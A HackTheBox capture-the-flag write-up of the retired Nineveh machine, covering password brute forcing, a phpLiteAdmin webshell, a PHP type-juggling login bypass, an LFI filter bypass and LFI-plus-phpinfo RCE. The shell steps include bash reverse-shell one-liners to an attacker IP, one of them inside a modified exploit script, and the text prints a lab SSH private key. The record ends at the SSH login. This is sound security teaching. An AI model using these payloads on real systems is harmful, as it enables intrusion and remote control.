---
title: HTB: Nineveh
url: https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html
date: 2020-04-22T10:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-nineveh, hackthebox, ctf, nmap, vhosts, gobuster, phpinfo, bruteforce, phpliteadmin, sql, sqlite, searchsploit, hydra, directory-traversal, lfi, webshell, strings, binwalk, tar, ssh, port-knocking, knockd, chkrootkit, pspy, oscp-like-v1
---

![Nineveh](https://0xdfimages.gitlab.io/img/nineveh-cover.png)

There were several parts about Nineveh that don’t fit with what I expect in a modern HTB machine - steg, brute forcing passwords, and port knocking. Still, there were some really neat attacks. I’ll show two ways to get a shell, by writing a webshell via phpLiteAdmin, and by abusing PHPinfo. From there I’ll use my shell to read the knockd config and port knock to open SSH and gain access using the key pair I obtained from the steg image. To get root, I’ll exploit chkroot, which is running on a cron.

## Box Info

| Name | [Nineveh](https://hackthebox.com/machines/nineveh)  [Nineveh](https://hackthebox.com/machines/nineveh) [Play on HackTheBox](https://hackthebox.com/machines/nineveh) |
| --- | --- |
| Release Date | 04 Aug 2017 |
| Retire Date | 16 Dec 2017 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Nineveh |
| Radar Graph | Radar chart for Nineveh |
| First Blood User | 02:30:26[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| First Blood Root | 02:51:16[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| Creator | [Yas3r Yas3r](https://app.hackthebox.com/users/596) |

### nmap

`nmap` shows only HTTP (TCP 80) and HTTPS (TCP 443) open:

```

root@kali# nmap -p- --min-rate 10000 --oA scans/nmap-alltcp 10.10.10.43
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 20:19 EDT
Nmap scan report for 10.10.10.43
Host is up (0.014s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
root@kali# nmap -p 80,443 -sV -sC --oA scans/nmap-tcpscripts 10.10.10.43
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 20:21 EDT
Nmap scan report for 10.10.10.43
Host is up (0.013s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds

```

### vhost Brute Force

There’s a hostname in the certificate, in the `nmap` scan, `nineveh.htb`. I want to check for subdomains that might be different. I’ll run `wfuzz`and fuzz the `Host` HTTP header. With `wfuzz`, I’ll always start it without the hiding flag, see what the default response looks like, and then Ctrl-c to kill it, and re-run with a flag to hide the default response. For the HTTP site `--hh 178` (`--hh` is hide by character length) worked, and `--hh 49` on the HTTPS site. Neither returned anything:

```

root@kali# wfuzz -c -u http://10.10.10.43/ -H "Host: FUZZ.nineveh.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 178
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.43/
Total requests: 100000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

Total time: 206.0595
Processed Requests: 100000
Filtered Requests: 100000
Requests/sec.: 485.2965

```

### Website - TCP 80

#### Site

The site just displays a simple success page with no further information:

![image-20200411052716506](https://0xdfimages.gitlab.io/img/image-20200411052716506.png)

This is the same visiting by IP address or `nineveh.htb`.

#### Directory Brute Force

I also started a `gobuster` to see what other paths may exist. I’ll include `-x php` because it’s Linux and that’s always worth guessing, even though `index.php` didn’t load manually in Firefox. This found two interesting paths:

```

root@kali# gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -o scans/gobuster-http-root-medium -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.43
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/11 05:28:16 Starting gobuster
===============================================================
/info.php (Status: 200)
/department (Status: 301)
/server-status (Status: 403)
===============================================================
2020/04/11 05:31:10 Finished
===============================================================

```

#### /info.php

This page presents a PHP Info page:

![image-20200411055526179](https://0xdfimages.gitlab.io/img/image-20200411055526179.png)

#### /department

The site presents a login form:

![image-20200411052327387](https://0xdfimages.gitlab.io/img/image-20200411052327387.png)

I tried some basic password guessing, and noticed that the error messages were indicating if the user existed. For example, when I tried admin:

![image-20200411052553834](https://0xdfimages.gitlab.io/img/image-20200411052553834.png)

When I tried nineveh:

![image-20200411052620519](https://0xdfimages.gitlab.io/img/image-20200411052620519.png)

### Website - TCP 443

#### Site

This site simply returns an image:

![image-20200411052935379](https://0xdfimages.gitlab.io/img/image-20200411052935379.png)

This is the same visiting by IP address or `nineveh.htb`.

#### Directory Brute Force

Running `gobuster` here also returns three paths:

```

root@kali# gobuster dir -k -u https://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o scans/gobuster-https-root-medium -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.43
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/11 05:10:49 Starting gobuster
===============================================================
/db (Status: 301)
/server-status (Status: 403)
/secure_notes (Status: 301)
===============================================================
2020/04/11 05:13:54 Finished
===============================================================

```

#### /db

`/db` returns a login for a phpLiteAdmin instance:

![image-20200411053200602](https://0xdfimages.gitlab.io/img/image-20200411053200602.png)

[phpLiteAdmin](https://www.phpliteadmin.org/) is a PHP interface for interacting with SQLite databases.

It’s version 1.9, which `searchsploit` shows there are exploits for:

```

root@kali# searchsploit phpliteadmin
---------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                  |  Path
                                                                | (/usr/share/exploitdb/)
---------------------------------------------------------------- ----------------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                  | exploits/php/webapps/24044.txt
phpLiteAdmin - 'table' SQL Injection                            | exploits/php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                     | exploits/php/webapps/37515.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                   | exploits/php/webapps/39714.txt
---------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

Examining each of these with `searchsploit -x [path]`, the first is a version match and seems like a good way to get execution. The second also looks like it should work, if I want to do SQLi. The third one is not a version match, and the fourth has a bunch of less interesting vulnerabilities like XSS and CSRF. For all of them, I need to authenticate first.

#### /secure\_notes

This page is just an image:

![](https://0xdfimages.gitlab.io/img/nineveh.png)

## Shell as www-data (via phpLiteAdmin)

### phpLiteAdmin Brute Force

Modern HTB doesn’t require brute force on passwords without some clear indication to do so. Nineveh must have been before that time. Given that I only have a password field, and there’s likely a code execution exploit, I started with phpLiteadmin using `hydra`. For a web brute force, I’ll want to start with a smaller password list. [SecLists](https://github.com/danielmiessler/SecLists) (`apt install seclists`) has a `twitter-banned.txt` that seems like a reasonable place to start:

```

root@kali# wc -l /usr/share/seclists/Passwords/twitter-banned.txt
397 /usr/share/seclists/Passwords/twitter-banned.txt

```

I’ll run `hydra` with the following options:
- `-l 0xdf` - `hydra` requires a username, even if it won’t use it
- `-P [password file]` - a file of passwords to try
- `https-post-form` - this is the plugin to use, which takes a string with three parts, `:` separated:
  - `/db/index.php` - the path to POST to
  - `password=^PASS^&remember=yes&login=Log+In&proc_login=true` - the POST data, with `^PASS^` being the thing that will be replaced with words from the wordlist
  - `Incorrect password` - text on the response that indicates failure to login

It finds the password very quickly:

```

root@kali# hydra 10.10.10.43 -l 0xdf -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-11 06:03:28
[DATA] max 16 tasks per 1 server, overall 16 tasks, 397 login tries (l:1/p:397), ~25 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password
[443][http-post-form] host: 10.10.10.43   login: 0xdf   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-11 06:03:36

```

### Enumerate phpLiteAdmin

With the password, I can login:

![image-20200411060847374](https://0xdfimages.gitlab.io/img/image-20200411060847374.png)

There is only one database, `test`, and it has no tables.

### PHP Injection

The exploit `24044.txt` from `searchsploit` describes how to exploit phpLiteAdmin to get RCE using the following steps:
1. Create a new database ending with `.php`:

   ![image-20200411061223961](https://0xdfimages.gitlab.io/img/image-20200411061223961.png)

</picture>
1. I’ll click on the new db to switch to it, and create a table with 1 text field with a default value of a basic PHP webshell:

   ![image-20200411061614183](https://0xdfimages.gitlab.io/img/image-20200411061614183.png)

</picture>

Note it’s important to use `"` in the PHP, as `'` is being used by the database to define the entire string:

![image-20200411061634696](https://0xdfimages.gitlab.io/img/image-20200411061634696.png)
1. View the page.

Unfortunately, I’m stuck here. I can see the path to the new `.php` webshell in `/var/tmp`:

![image-20200411061953672](https://0xdfimages.gitlab.io/img/image-20200411061953672.png)

But I lack the LFI necessary to access that page in a browser.

### /department Type Confusion

Given the fact that I was able to identify a username of admin already, I could try to brute force the password here too (and it would work with a large enough list, like `rockyou.txt`). But before doing that I checked for a PHP type juggling bug by sending in the `password` POST data as an array. When I submit the form from Firefox, Burp shows the POST data as:

```

username=admin&password=admin

```

If I change this to:

```

username=admin&password[]=

```

It let’s me in:

![image-20200411062649071](https://0xdfimages.gitlab.io/img/image-20200411062649071.png)

Why does this work? PHP is generous with how it handles comparing different types of data. So if the PHP is doing a string compare of a password from a database (or hard codeded as is the case here) and the user input, it might look like this:

```

if(strcmp($_REQUEST['password'], $password) == 0)

```

`strcmp` returns where the two strings differ, as I can see in an interactive PHP terminal (run `php -a`):

```

php > strcmp("admin", "0xdf");
php > echo strcmp("admin", "0xdf");
1
php > echo strcmp("admin", "admin0xdf");
-4
php > echo strcmp("admin", "admin");
0

```

If I pass in an array as one of the strings, PHP fails:

```

php > echo strcmp(array(), "admin");
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1

```

However, it is actually returning a NULL, and if that NULL is then compared to 0, it evaluates true:

```

php > if (strcmp(array(), "admin") == 0) { echo "oops"; }
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
oops

```

### Enumerate manage.php

On login, I’m redirected to `manage.php`, as shown above. In addition to the home button which just shows the under construction image, there’s a Notes button which just adds `?notes=files/ninevehNotes.txt` to the same PHP page and displays this text under the image:

![image-20200411063735004](https://0xdfimages.gitlab.io/img/image-20200411063735004.png)

The login page with hardcoded username and password is likely what I bypassed with type confusion. The secret folder reference is interesting. I’ll come back to that. And the db interface is something I’ve already exploited.

### LFI POC

Anytime I see a url that seems to give a file path as an argument, I want to poke at it for local file include (especially now since that’s what I need to get RCE).

I tried a handful of things to get a feel for what was going on:

| notes parameter | Error Message |
| --- | --- |
| `ninevehNotes.txt` | No error, displays note |
| `/etc/passwd` | No Note is selected. |
| `../../../../../../../../../../etc/passwd` | No Note is selected. |
| `ninevehNotes` | Warning: include(files/ninevehNotes): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31 |
| `ninevehNote` | No Note is selected. |
| `files/ninevehNotes/../../../../../../../../../etc/passwd` | File name too long. |
| `files/ninevehNotes/../../../../../../../etc/passwd` | The contents of `/etc/passwd` |
| `/ninevehNotes/../etc/passwd` | The contents of `/etc/passwd` |

It took a minute to realize, but it seems to be checking that the phrase `ninevehNotes` is in the parameter, or it just displays “No Note is selected.”. But there are ways to get around that, either by just removing the extension and going up directories, or starting at `/` and then going into a non-existent folder `ninevehNotes` and immediately back out with `../`. The system is nice enough to cancel those two out, while allowing PHP to pass the string check.

### RCE

Now I can access the webshell I left earlier at `http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/0xdf.php&cmd=id`

![image-20200411065028130](https://0xdfimages.gitlab.io/img/image-20200411065028130.png)

### Shell

To get a shell, I’ll just change the `cmd` to `bash -c 'bash -i >%26 /dev/tcp/10.10.14.24/443 0>%261'` (it’s important to url encode the `&` or they will be interpreted as starting a new parameter). I get a shell in `nc`:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.43.
Ncat: Connection from 10.10.10.43:40460.
bash: cannot set terminal process group (1387): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ 

```

Python2 isn’t on Nineveh, but Python3 is:

```

www-data@nineveh:/var/www/html/department$ python -c 'import pty;pty.spawn("bash")'
The program 'python' can be found in the following packages:
 * python-minimal
 * python3
Ask your administrator to install one of them
www-data@nineveh:/var/www/html/department$ python3 -c 'import pty;pty.spawn("bash")'

```

I’ll Ctrl-z, `stty raw -echo`, `fg`, `reset` to get a fully functional shell.

As www-data, I can see `user.txt` in `/home/amrois`, but I can’t read it.

## Shell as www-data (via phpinfo.php)

### Background

I remember seeing Ippsec exploit this technique in his [Poison video](https://youtu.be/rs4zEwONzzk?t=601). Insomnia Security has a [really neat paper](https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf) from 2011 about how LFI + PHPINFO = RCE. First, PHP has to be configured with `file_uploads = on`. Fortunately, that is the case here:

![image-20200411070402024](https://0xdfimages.gitlab.io/img/image-20200411070402024.png)

This means that any PHP request will accept uploaded files, which are stored to a temporary location until the PHP request is fully processed, and then they will be thrown away. PHPINFO is nice enough to list those files. I can show this by catching a request to `/info.php` in Burp Proxy and modify it into a POST request with a dummy file like this:

```

POST /info.php HTTP/1.1
Host: 10.10.10.43
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=ehjpe8sp040ma068aen884obr7
Upgrade-Insecure-Requests: 1
Content-Length: 194
Content-Type: multipart/form-data; boundary=---------------------------7db268605ae
-----------------------------7db268605ae
Content-Disposition: form-data; name="dummyname"; filename="test.txt" Content-Type: text/plainSecurity
Test
-----------------------------7db268605ae

```

I changed `GET` to `POST`, added the `Content-Type` header, and the POST body.

The resulting page include this:

![image-20200411073056237](https://0xdfimages.gitlab.io/img/image-20200411073056237.png)

That include the filename where this file is stored!

That file only exists for a fraction of a second, but sometimes I can win the race and visit the page before it goes away. Insomnia puts a lot of padding into the HTTP headers to increasing the processing time and therefore the chances that attacker can win the race.

### Script Modifications

Insomnia provides [a Python script](https://www.insomniasec.com/downloads/publications/phpinfolfi.py) that will exploit this. I’ll download it, but it requires someediting to get it to work in this case.

First, I’ll collect some variables I’ll need at the top:

```

local_ip = "10.10.14.24"
local_port = 443
phpsessid = "ehjpe8sp040ma068aen884obr7"

```

The `PHPSESSID` will need to point to a valid session. Were I re-writing this from scratch, I’d have the script just log in and get a session id that way, but there’s too much going on here I don’t want to mess with now.

Now, I’ll change a bunch in the `setup` function at the top:

```

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r <?php system("bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'");?>\r""" % (TAG, local_ip, local_port)
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=""" + phpsessid + """; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /department/manage.php?notes=/ninevehNotes/..%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Cookie: PHPSESSID=""" + phpsessid + """\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

```

I made the following changes:
- Changed the payload so that it will return a reverse shell to the ip and port specified above.
- Changed the POST path in `REQ1` to `/info.php` rather than `/phpinfo.php` to match Nineveh.
- Changed the POST path in `LFIREQ` to the Nineveh LFI.
- Added a `PHPSESSID` cookie to the `LFIREQ` so that I could access the LFI.

The other thing I had to change was two places in the code where it looks in a response for `[tmp_name] =>`. PHP now HTML encodes that to `[tmp_name] =&gt;`, so I need to fix that. Interestingly enough, in the paper it also has the encoded version, so it might just be an error in the script.

### Shell

With those changes in place, I can run the script with a `nc` listener waiting:

```

root@kali# python phpinfolfi.py 10.10.10.43 80 100
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 125163
Spawning worker pool (100)...
 101 /  1000

```

It froze at that point, with a shell on `nc`:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.43.
Ncat: Connection from 10.10.10.43:43916.
bash: cannot set terminal process group (1387): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Priv: www-data –> amrois

### Enumeration

Without much to find on this box, I turned back to the clues I already had, specifically, the `/secure_notes` directory that just output an image, and the note from the logged in page that said to check the secret folder to get in, and this was a challenge.

The `/secure_notes` directory just has the `.png` and `index.html`:

```

www-data@nineveh:/var/www/ssl/secure_notes$ ls
index.html  nineveh.png

```

When a CTF leads you to a place and then all you find is an image, it’s worth inspecting it a bit more. Running `strings` validates that inclination:

```

www-data@nineveh:/var/www/ssl/secure_notes$ strings -n 20 nineveh.png 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb

```

### Pull Apart Steg

To put a bit more inspection on this, I’ll go to Firefox and download this image to my local machine. Running `binwalk` shows that a `tar` archive is appended to the end of the file:

```

root@kali# binwalk nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)

```

I can use `-e` to extract all the files, and it will even unpack the archive:

```

root@kali# binwalk -e nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)

root@kali# find _nineveh.png.extracted/
_nineveh.png.extracted/
_nineveh.png.extracted/54
_nineveh.png.extracted/2BF8D0.tar
_nineveh.png.extracted/54.zlib
_nineveh.png.extracted/secret
_nineveh.png.extracted/secret/nineveh.priv
_nineveh.png.extracted/secret/nineveh.pub

```

The private key looks normal:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----

```

The public key gives a username, amrois:

```

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb

```

### Examine Port Knocking

The other interesting thing that jumped out from the shell as www-data is the `knockd` process :

```

www-data@nineveh:/$ ps auxww
...[snip]...
root      1334  1.1  0.2   8756  2228 ?        Ss   Apr10  15:29 /usr/sbin/knockd -d -i ens33
...[snip]...

```

`knockd` is a daemon for port knocking, which will set certain firewall rules when certain ports are hit in order. I can find the config file at `/etc/knockd.conf`:

```

www-data@nineveh:/$ cat /etc/knockd.conf 
[options]
 logfile = /var/log/knockd.log
 interface = ens33

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

```

This says I can open SSH by hitting 571, 290, and then 911 with syns, all within 5 seconds, and on doing so, it will add a rule to allow my IP to get to port 22.

### Knock

[This wiki page](https://wiki.archlinux.org/index.php/Port_knocking) gives a good example of using `nmap` to port knock. I’ll write it as a one liner:

```

root@kali# for i in 571 290 911; do
> nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.10.43 >/dev/null
> done; ssh -i ~/keys/id_rsa_nineveh_amrois amrois@10.10.10.43
Ubuntu 16.04.2 LTS
